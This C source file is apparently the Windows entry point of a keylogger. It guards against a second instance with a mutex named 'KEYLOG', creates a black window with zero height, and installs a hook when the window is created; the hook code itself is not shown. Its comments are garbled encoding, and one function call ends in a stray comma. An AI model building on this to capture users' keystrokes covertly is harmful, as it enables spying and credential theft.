#include "winHead.h"


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstanc, LPSTR lpCmdLine, int nCmdShow) {
	// ȷ������Ϊ��һ���е�ʵ��
	if (IsAlreadyRun()) {
		MessageBoxA(NULL, "�����Ѿ����У�", "����", MB_OK);
		return -1;
	}
	
	// ��ƴ�����
	WNDCLASS wc = { 0 };
	TCHAR szWinClassName[] = TEXT("lue");

	wc.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));	// ���ڱ���
	wc.hInstance = hInstance;	// ʵ����� 
	wc.lpfnWndProc = WindowProc;	// ���ڴ�����
	wc.lpszClassName = szWinClassName;	// ����������
	wc.style = CS_HREDRAW | CS_VREDRAW;	// ��������

	// ע�ᴰ����
	RegisterClass(&wc);

	// ��������
	HWND hWnd = CreateWindow(
		szWinClassName,
		TEXT("���Ͱ���"), // ���ڱ���
		WS_OVERLAPPEDWINDOW,	// ���ڷ��
		100, 100,	// �������Ͻ�����
		250, 0,	// ���ڿ��
		NULL,	// �����ھ��
		NULL,	// �˵����
		hInstance,	// Ӧ�ó���ʵ�����
		NULL,	// ������Ϣ
		);

	// ��ʾ����
	ShowWindow(hWnd, SW_SHOW);

	// ���´���
	UpdateWindow(hWnd);

	// ��Ϣѭ��
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);	// ת����Ϣ
		DispatchMessage(&msg);	// �ַ���Ϣ
	}

	return 0;
}

BOOL IsAlreadyRun()
{
	HANDLE hMutex = NULL;
	// ����������
	hMutex = CreateMutexA(NULL, FALSE, "KEYLOG");
	if (hMutex)
		if (ERROR_ALREADY_EXISTS == GetLastError())
			return TRUE;
	return FALSE;
}

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
	case WM_CREATE:	//���ڴ���
		InstallHook();
		break;
	case WM_CLOSE:	// ���ڹر���Ϣ
		DestroyWindow(hWnd);	// ���ٴ���
		break;
		
	case WM_DESTROY:	// �����˳���Ϣ
		UninstallHook();
		PostQuitMessage(0);	// �˳�����
		break;
	}

	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}
